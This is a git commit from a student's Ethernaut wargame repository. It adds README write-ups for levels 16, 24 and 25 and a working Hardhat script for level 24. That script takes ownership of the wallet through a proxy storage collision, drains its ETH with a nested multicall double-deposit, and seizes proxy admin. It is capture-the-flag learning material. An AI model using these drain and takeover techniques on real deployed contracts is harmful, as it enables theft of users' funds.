a6ece8d3f707b516cdf44ac52489040e7a9bf2c2
dm4th <danny.mathieson233@gmail.com>
2023-02-03 10:44:30 -0800

    Finished ethernaut 24 -- all caught up on week 10

--- wk10-upgrades/ethernaut/README.md
+++ wk10-upgrades/ethernaut/README.md
@@ -13,35 +13,49 @@ await sendTransaction({
 
 ## Problem 16
 
-We first create an attack contract (PreservationPwn in challenge16.sol) with the same memory layout as the Preservation contract. We then convert our contract's address to an integer so that we can fit the correct signature for ```setTime(uint _time)```. We can set the first library's address by making a delegatecall to the LibraryContract because it modifies the fisrt slot, so we'll call 
+We first create an attack contract (PreservationPwn in challenge16.sol) with the same memory layout as the Preservation contract. We then convert our contract's address to an integer so that we can fit the correct signature for 
+```
+setTime(uint _time)
+```
+. We can set the first library's address by making a delegatecall to the LibraryContract because it modifies the fisrt slot, so we'll call 
 ```js
 await contract.setFirstTime("INT VERSION OF ATTACK CONTRACT ADDRESS"); 
-````
-so that anytime we call the setTime function, we'll now call out attack function's version. In our attack contract we simly set owner = msg.sender because we have the same memory layout. Calling the setFirstTime function with any arbotrary input will take control of the contract.
+```
+so that anytime we call the setTime function, we will now call out attack function's version. In our attack contract we simply set owner = msg.sender because we have the same memory layout. Calling the setFirstTime function with any arbotrary input will take control of the contract.
 
 ## Problem 24
 
-Jeez this one was difficult....
+Jeez this one was difficult.... I outlined each step in detail in comments in scripts/challenge24.js
+
+The first step is realizing that you can connect to both the proxy & wallet contracts with the same contract address.
+Using that knowledge, you can call 
+'''
+proposeNewAdmin(YOUR_ADDRESS)
+''' 
+on the proxy contract to make yourself the owner
+of the wallet contract (the function overwrites slot 0 in both contracts).
+
+The second step is adding yourself to the whitelist to be able to perform functions on the wallet contract. Now that you're
+the owner of teh wallet contract you can just call 
+'''
+addToWhitelist(YOUR_ADDRESS)
+'''
+
+Now that we can perform actions on the wallet contract, we need to call "setMaxBalance" to overwrite slot 1 in both contracts (including the admin address in the proxy.. our goal).
+
+Before we can do taht though we need to make the contract have 0 balance. To drain the contract we create a multicall with 3 functions and a msg.value == the contract's balance:
+- deposit --> adds eth to the contract and increments our balance to 1 contract balance
+- multicall(deposit) --> we then have to re-call multicall to reset the flag that we aren't reusing our msg.value. this sets our balance to 2 contract balances even though we're only sending 1 contract balance.
+- execute(YOUR_ADDRESS, contract balance * 2, []) --> we withdraw 2 contract balances worth of ETH to drain the contract
+
+Now that the contract is drained we can call 
+'''
+setMaxBalance(YOUR_ADDRESS)
+'''
+to beat the level.
 
 ## Problem 25
 
 The first step is getting the contract of the engine contract from the motorbike contract, which is as simple as getting the storage at slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc (based on the UUPS protocol specs).
 
 Next you need to create a Hack Contract that first calls "initialize" on the engine contract to assume the upgrader role. Once you're the upgrader, you can use the "upgradeToAndCall" function to call any arbitrary code in another contract (just a simple self destruct in this case).
-
-
-
-
-# Sample Hardhat Project
-
-This project demonstrates a basic Hardhat use case. It comes with a sample contract, a test for that contract, and a script that deploys that contract.
-
-Try running some of the following tasks:
-
-```shell
-npx hardhat help
-npx hardhat test
-REPORT_GAS=true npx hardhat test
-npx hardhat node
-npx hardhat run scripts/deploy.js
-```
--- wk10-upgrades/ethernaut/scripts/challenge24.js
+++ wk10-upgrades/ethernaut/scripts/challenge24.js
@@ -1,62 +1,63 @@
-// We require the Hardhat Runtime Environment explicitly here. This is optional
-// but useful for running the script in a standalone fashion through `node <script>`.
-//
-// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
-// will compile your contracts, add the Hardhat Runtime Environment's members to the
-// global scope, and execute the script.
 const hre = require("hardhat");
 
 async function main() {
 
   const [player] = await hre.ethers.getSigners();
-  // Use the ABI form both the proxy contract and wallet contract pointed at the wallet address
-  const contractAddress = '0xbDf6D8D134505A81ab0a95eb7275a097E69f21E1';
-  const proxy = await hre.ethers.getContractAt("PuzzleProxy", contractAddress);
+  // Contract instance actually refers to IMPLEMENTATION contract rather than the proxy contract
+  // In this case we can use the ABI from the proxy contract & the wallet address to interact with either contract
+  // But in either case we'll be overwriting the storage in the wallet contract
+  const contractAddress = '0x7f375A79A3d15e846966fa8ed205A308258C772b';
+  // Connect to the puzzle wallet instance
   const wallet = await hre.ethers.getContractAt("PuzzleWallet", contractAddress);
+  // Connect to the proxy contract with the same address
+  const proxy = await hre.ethers.getContractAt("PuzzleProxy", contractAddress);
 
-  // Step 1: Become a pendingAdmin on the proxy contract which will by proxy make us the owner of the wallet contract
-  // const tx1 = await proxy.connect(player).proposeNewAdmin(player.address);
-  // const receipt1 = await tx1.wait()
-  // console.log(`Proxy Pending Admin: ${await proxy.connect(player).pendingAdmin()}`);
-  // console.log(`Wallet Owner: ${await wallet.connect(player).owner()}`);
+  // // If we call "proposeNewAdmin(address) on the proxy contract we'll overwrite slot 0 in the wallet contract -- which is the owner"
+  const tx1 = await proxy.connect(player).proposeNewAdmin(player.address);
+  const receipt1 = await tx1.wait()
+  // // Check that we're now the owner of the wallet contract and a pendingAdmin of the proxy contract
+  console.log(`Proxy Pending Admin: ${await proxy.connect(player).pendingAdmin()}`);
+  console.log(`Wallet Owner: ${await wallet.connect(player).owner()}\n`);
 
-  // // Step 2: Add myself to the whitelist
-  // const tx2 = await wallet.connect(player).addToWhitelist(player.address);
-  // const receipt2 = await tx2.wait()
-  // console.log(`Player added to whitelist: ${await wallet.connect(player).whitelisted(player.address)}`); // will return true if completed successfully
+  // // Now that we're the owner of the wallet contract we can add ourselves to the whitelist to do other functions on the contract
+  const tx2 = await wallet.connect(player).addToWhitelist(player.address);
+  const receipt2 = await tx2.wait()
+  // // Check we're on the whitelist
+  console.log(`Player added to whitelist: ${await wallet.connect(player).whitelisted(player.address)}\n`); // will return true if completed successfully
 
-  // Step 3: Draining the wallet so that we can call the setMaxBalance variable to set ourselves as the admin 
-  // I had to look this up....
-  // We need to set up 3 separate function signatures:
-    // 1: We need to invoke the PuzzleWallet deposit function
-    // 2: We need to call the multicall function (which will call deposit again)
-    // 3: Call execute to ourselves --> Because we've effectively called deposit twice in the previous two functions, we'll actually get 2x our ETH
-  console.log(`Contract Balance Before Hack: ${await hre.ethers.provider.getBalance(wallet.address)}`);
-  const func1 = hre.ethers.utils.keccak256(
-    hre.ethers.utils.toUtf8Bytes('deposit()')
-  );
-  const func2 = hre.ethers.utils.keccak256(
-    hre.ethers.utils.toUtf8Bytes('multicall(bytes[])'),
-    hre.ethers.utils.toUtf8Bytes('deposit()')
-  );
-  const func3 = hre.ethers.utils.keccak256(
-    hre.ethers.utils.toUtf8Bytes('execute(address,uint256,bytes)'),
-    hre.ethers.utils.toUtf8Bytes(player.address),
-    hre.ethers.utils.toUtf8Bytes(hre.ethers.utils.parseEther("0.0001")),
-    hre.ethers.utils.toUtf8Bytes([])
-  );
+  // Similarly to how we became the owner of the wallet, we'll call the "setMaxBalance" with the uint256 of our own address
+  // This is set an arbitrary maxBalance on the wallet contract --- but also set us to the admin on the proxy contract!!
+  
+  // First we need to drain the contract though. Let's get the total balance
+  const contractEth = await hre.ethers.provider.getBalance(wallet.address);
+  console.log(`Contract Balance Before Hack: ${ethers.utils.formatEther(contractEth)} ETH`);
+
+  // To drain the contract we're going to call multicall to run 3 calls within 1 transaction:
+    // 1: We'll call deposit with a value of "contractEth"
+      // this will increment our balance in the contract to be = contractEth
+  const func1 = wallet.interface.encodeFunctionData('deposit');
+
+    // 2: We'll call mulitcall with 1 deposit call again 
+      // this will reset the "depositCalled" flag, allowing us to "deposit" double the Eth than hat we're sending in msg.value
+  const func2 = wallet.interface.encodeFunctionData('multicall', [[func1]]);
+      // 3: Call execute to ourselves with a value of double the contract Eth.. 
+      // We've deposited 1 contractEth, and the contract has 1 contractEth, but our balance according to the contract is 2 contractEth
+  const func3 = wallet.interface.encodeFunctionData('execute', [player.address, contractEth*2, []]);
   const funcArray = [func1, func2, func3];
-  console.log(funcArray);
-  const tx3 = await wallet.connect(player).multicall(funcArray, { from: player.address, value: hre.ethers.utils.parseEther("0.00005") });
+  console.log(`Encoded Attack Functions Array:\t${funcArray}`);
+  const tx3 = await wallet.connect(player).multicall(funcArray, { from: player.address, value: contractEth });
   const receipt3 = await tx3.wait();
-  console.log(`Contract Balance After Hack: ${await hre.ethers.provider.getBalance(wallet.address)}`);
+  console.log(`Contract Balance After Hack: ${await hre.ethers.provider.getBalance(wallet.address)}\n`);
 
+  // Now that the contract has 0 ETH we can call setMaxBalance with our own address to overwrite the second memory slot in both contracts
+  // which includes the admin address in the proxy contract
+
+  tx4 = await wallet.connect(player).setMaxBalance(player.address);
+  const receipt4 = await tx4.wait();
+  console.log(`New admin:\t${await proxy.connect(player).admin()}`);
 }
 
-// We recommend this pattern to be able to use async/await everywhere
-// and properly handle errors.
 main().catch((error) => {
   console.error(error);
   process.exitCode = 1;
 });
-// main()
